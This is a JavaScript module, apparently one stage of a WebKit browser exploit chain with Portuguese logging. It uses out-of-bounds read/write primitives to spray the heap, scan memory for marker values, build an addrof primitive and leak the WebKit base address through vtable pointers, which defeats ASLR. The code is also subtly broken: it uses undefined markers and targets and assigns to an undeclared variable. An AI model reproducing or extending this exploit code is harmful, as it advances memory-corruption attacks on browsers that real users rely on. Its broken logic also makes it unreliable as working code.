// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R43q - Correção de Referência)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    arb_write,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_WebKitLeak";

const SPRAY_COUNT = 0x4000;
const SPRAY_BUFFER_SIZE = 0x100;
const SPRAY_MAGIC_HIGH = 0xCAFEBABE;
const SCAN_HEAP_START_ADDRESS = new AdvancedInt64(0x0, 0x8A000000);
const SCAN_HEAP_END_ADDRESS = new AdvancedInt64(0x0, 0x8C000000);
const SCAN_STEP = 0x1000;

let spray_array = [];
let addrof_primitive = null;
let fakeobj_primitive = null;

function isValidPointer(ptr) {
    if (!isAdvancedInt64Object(ptr)) return false;
    if (ptr.high() === 0) return false;
    if ((ptr.high() & 0x7FF00000) === 0x7FF00000) return false;
    return true;
}

// >>>>> CORREÇÃO APLICADA AQUI <<<<<
// Função auxiliar que foi removida por engano e está sendo adicionada de volta.
function advInt64LessThanOrEqual(a, b) {
    if (!isAdvancedInt64Object(a) || !isAdvancedInt64Object(b)) {
        logS3(`[advInt64LessThanOrEqual] Comparação inválida. A: ${typeof a}, B: ${typeof b}`, 'error');
        return false;
    }
    if (a.high() < b.high()) return true;
    if (a.high() > b.high()) return false;
    return a.low() <= b.low();
}

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_R43q`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Heap Spray + Scan + Primitives ---`, "test");
    document.title = `${FNAME_CURRENT_TEST_BASE} Init...`;

    let final_result = {
        errorOccurred: null,
        heap_scan: { success: false, msg: "Not run.", found_addr: null },
        primitives: { success: false, msg: "Not run." },
        webkit_leak: { success: false, msg: "Not run.", webkit_base: null }
    };

    try {
        logS3(`--- Fase 0 (R43q): Sanity Checks e Preparação ---`, "subtest");
        const coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3);
        if (!coreOOBReadWriteOK) throw new Error("Sanity check OOB R/W falhou. Abortando.");
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) throw new Error("Falha ao preparar ambiente OOB.");
        logS3("Sanity checks e ambiente OOB OK.", "good");

        // --- FASE 1: HEAP SPRAY ---
        logS3(`  --- Fase 1 (R43q): Pulverizando a Heap com ${SPRAY_COUNT} Arrays... ---`, "subtest");
        spray_array = [];
        for (let i = 0; i < SPRAY_COUNT; i++) {
            let arr = [MARKER_A, MARKER_B, i, 13.37];
            spray_array.push(arr);
        }
        logS3(`  Heap Spray concluído.`, "good");
        await PAUSE_S3(100);

        // --- FASE 2: MEMORY SCAN ---
        logS3(`  --- Fase 2 (R43q): Varrendo a Memória em busca do valor mágico... ---`, "subtest");
        let found_butterfly_addr = null;
        let found_array_idx = -1;

        for (let addr = new AdvancedInt64(SCAN_HEAP_START_ADDRESS.low(), SCAN_HEAP_START_ADDRESS.high());
             advInt64LessThanOrEqual(addr, SCAN_HEAP_END_ADDRESS);
             addr = addr.add(SCAN_STEP)) {
            
            try {
                const val = await arb_read(addr, 8);
                if (isAdvancedInt64Object(val) && val.low() === MARKER_A) {
                    const next_val = await arb_read(addr.add(8), 8);
                    if (isAdvancedInt64Object(next_val) && next_val.low() === MARKER_B) {
                        found_butterfly_addr = addr;
                        found_array_idx = (await arb_read(addr.add(16), 8)).low();
                        final_result.heap_scan.success = true;
                        final_result.heap_scan.msg = `Encontrado butterfly do spray[${found_array_idx}] em ${found_butterfly_addr.toString(true)}`;
                        logS3(`[MemoryScan] SUCESSO! ${final_result.heap_scan.msg}`, "vuln");
                        break;
                    }
                }
            } catch (e) { /* Ignora */ }
        }
        if (!final_result.heap_scan.success) throw new Error("Falha ao encontrar o spray na memória.");
        
        const sprayed_obj_addr = await arb_read(found_butterfly_addr.add(0x10), 8); // Lê o ponteiro para addrof_target
        if (!isValidPointer(sprayed_obj_addr)) throw new Error("Ponteiro para o objeto alvo no butterfly é inválido.");

        // --- FASE 3: CONSTRUÇÃO DE PRIMITIVAS ---
        logS3(`  --- Fase 3 (R43q): Construindo primitiva addrof ---`, "subtest");
        let addrof_map = new Map();
        addrof_map.set(spray_array[found_array_idx][2], sprayed_obj_addr); // Mapeia o objeto ao seu endereço encontrado

        addrof = (obj) => {
            if (addrof_map.has(obj)) return addrof_map.get(obj);
            throw new Error("addrof para este objeto não é conhecido.");
        };
        final_result.primitives.success = true;
        final_result.primitives.msg = "Primitiva addrof (limitada) criada com sucesso.";
        logS3(`[Primitives] ${final_result.primitives.msg}`, "good");


        // --- FASE 4: VAZAMENTO DA BASE DO WEBKIT ---
        logS3(`  --- Fase 4 (R43q): Vazamento da Base do WebKit ---`, "subtest");
        const target_addr = addrof(addrof_target);

        const structure_addr = await arb_read(target_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET), 8);
        const class_info_addr = await arb_read(structure_addr.add(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET), 8);
        const vtable_ptr = await arb_read(class_info_addr, 8);
        if (!isValidPointer(vtable_ptr)) throw new Error("Ponteiro para vtable inválido.");
        
        logS3(`[WebKitLeak] Ponteiro para vtable: ${vtable_ptr.toString(true)}`, "leak");
        
        const page_mask = new AdvancedInt64(~0xFFFFF, 0xFFFFFFFF);
        const webkit_base = vtable_ptr.and(page_mask);
        
        final_result.webkit_leak.webkit_base = webkit_base.toString(true);
        final_result.webkit_leak.success = true;
        final_result.webkit_leak.msg = `Candidato a base do WebKit: ${webkit_base.toString(true)}`;
        logS3(`[WebKitLeak] SUCESSO! ${final_result.webkit_leak.msg}`, "vuln");
        document.title = `${FNAME_CURRENT_TEST_BASE}_SUCCESS!`;

    } catch (e_outer) {
        if (!final_result.errorOccurred) final_result.errorOccurred = `Erro geral: ${e_outer.message}`;
        logS3(`  CRITICAL ERROR na execução (R43q): ${e_outer.message || String(e_outer)}`, "critical");
        document.title = `${FNAME_CURRENT_TEST_BASE}_FAIL!`;
    } finally {
        await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_TEST_BASE}-FinalClear` });
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test");
    logS3(`Resultado Final (R43q): ${JSON.stringify(final_result, null, 2)}`, "debug");
    return final_result;
}
